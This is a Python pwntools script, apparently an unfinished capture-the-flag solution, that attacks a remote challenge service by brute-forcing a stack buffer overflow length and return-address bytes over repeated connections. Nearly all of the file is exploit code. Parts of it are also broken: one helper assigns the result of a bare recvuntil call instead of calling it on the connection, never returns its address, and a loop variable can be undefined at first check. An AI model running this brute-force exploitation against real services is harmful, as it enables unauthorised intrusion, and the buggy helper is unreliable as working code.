#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

context.log_level="debug"

r= remote("pwn.sixstars.team",23008)


# retaddr from  0x28
log1 = 0x27
byte1 = 0


''' # detect the overflow length
w=''
for i in range(0x15,0x1000):
    for j in range(0x100):
        ir = remote("pwn.sixstars.team",23008)
        ir.recvuntil("Let's end the road of stackoverflow:")
        ir.sendline('a'*i+chr(j))
        ir.recvuntil('Bye!\n')
        try:
            w=ir.recv()
            print w
        except:
            ir.close()
        else:
            ir.close()
            log1= i
            byte1=j
            break
    if w:
        break
'''
print hex(log1)
print hex(byte1)

def get_addr(payload):
    addr = 0
    for i in range(8):
        for j in range(0x100):
            ir = remote("pwn.sixstars.team", 23008)
            ir = recvuntil("let's end the road of stackoverflow:")
            ir.sendline(payload+chr(j))
            ir.recvuntil('Bye!\n')
            try:
                w=ir.recv()
                print w
            except:
                ir.close()
            else:
                payload += chr(j)

                ir.close()


for i in range(0x15,0x1000):
    for j in range(0x100):
        ir = remote("pwn.sixstars.team",23008)
        ir.recvuntil("Let's end the road of stackoverflow:")
        ir.sendline('a'*i+chr(j))
        ir.recvuntil('Bye!\n')
        try:
            w=ir.recv()
            print w
        except:
            ir.close()
        else:
            ir.close()
            log1= i
            byte1=j
            break
    if w:
        break

